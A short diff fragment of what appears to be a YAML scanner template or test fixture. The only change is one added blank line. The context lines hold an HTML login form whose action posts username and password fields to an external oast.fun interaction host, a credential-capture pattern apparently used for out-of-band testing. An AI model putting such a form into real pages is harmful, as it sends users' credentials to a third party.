@@ -6,6 +6,7 @@ info:
     <form action="https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun/submit" method="post">
       <input type="text" name="username" placeholder="Username">
       <input type="password" name="password" placeholder="Password">
+      
       <button type="submit">Submit</button>
     </form>
   version: production
